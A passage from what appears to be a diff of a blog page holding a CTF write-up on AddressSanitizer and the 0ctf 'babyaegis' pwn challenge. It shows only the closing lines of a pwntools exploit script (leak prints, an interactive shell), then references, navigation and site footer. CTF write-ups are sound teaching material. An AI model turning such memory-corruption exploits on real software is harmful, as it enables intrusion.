class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(hex(lbase))</span></span><br><span class="line"><span class="comment">#print(hex(stack))</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/google/sanitizers/wiki/AddressSanitizerAlgorithm">github-AddressSanitizer</a></p>
+<p><a href="https://www.usenix.org/system/files/conference/atc12/atc12-final39.pdf">AddressSanitizer: A Fast Address Sanity Checker</a></p>
+<p><a href="https://blog.csdn.net/pang241/article/details/76137969">AddressSanitizer算法及源码解析</a></p>
+<p><a href="https://blog.csdn.net/pang241/article/details/76137969">Bypassing AddressSanitizer</a></p>
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+</div>
+
+
+  <footer class="post-footer">
+  
+    <div class="post-categories">
+      <span class="meta-label">Categories: </span>
+      
+        <a href="/categories/Other/" class="category">Other</a>
+      
+    </div>
+  
+  
+    <div class="post-tags">
+      <span class="meta-label">Tags: </span>
+      
+        <a href="/tags/asan/" class="tag">asan</a>
+      
+    </div>
+  
+</footer>
+
+
+  
+<nav class="post-nav">
+  
+    <div class="post-nav-item prev">
+      <span class="post-nav-label">&larr; Prev</span>
+      <a href="/easy-way-to-unpacking-theminda2.x.html" class="post-nav-title">
+        一个脱 themida 强壳的特殊方法
+      </a>
+    </div>
+  
+
+  
+    <div class="post-nav-item next">
+      <span class="post-nav-label">Next &rarr;</span>
+      <a href="/io-file-pwn.html" class="post-nav-title">
+        IO_FILE Pwn 利用整理
+      </a>
+    </div>
+  
+</nav>
+
+
+
+  
+    <section class="comments-section">
+  <h3 class="comments-title">Comments</h3>
+
+  
+    <div id="disqus_thread"></div>
+    <script>
+      var disqus_config = function () {
+        this.page.url = 'https://bestwing.me/asan-and-asan-in-ctf-0ctf-babyaegis.html';
+        this.page.identifier = 'asan-and-asan-in-ctf-0ctf-babyaegis.html';
+      };
+      (function() {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://swing.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+      })();
+    </script>
+  
+
+  
+
+  
+</section>
+
+  
+</article>
+
+        </div>
+      
+    </main>
+
+    <footer class="footer">
+  <div class="footer-content">
+    <div class="footer-left">
+      
+      <span class="copyright">
+        &copy; 2015 - 2026 Swing
+      </span>
+    </div>
+
+    <div class="footer-right">
+      
+        <span class="powered">
+          Powered by Hexo <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
+        </span>
+      
+      
+        <span class="theme-info">
+          Theme <a href="https://github.com/WinMin/hexo-theme-Bloom" target="_blank" rel="noopener">Bloom</a>
+        </span>
+      
+    </div>
+  </div>
+
+  
+    <div class="footer-social">
+      
+        <a href="https://github.com/WinMin" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
+          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+        </a>
+      
+      
+        <a href="https://twitter.com/bestswngs" class="social-link" target="_blank" rel="noopener" aria-label="Twitter">
+          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+        </a>
+      
+      
+      
+        <a href="mailto:ask@mail.exp.sh" class="social-link" aria-label="Email">
+          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+        </a>
+      
+      
+        <a href="/atom.xml" class="social-link" aria-label="RSS">
+          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1z"/></svg>
+        </a>
+      
+    </div>
+  
+</footer>
+
+  </div>
+
+  <!-- Main Script -->
+
+<script src="/js/main.js"></script>
+
+
+<!-- Search -->
+
+
+<script src="/js/search.js"></script>
+
+
+
+<!-- Baidu Analytics -->
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+</body>
+</html>
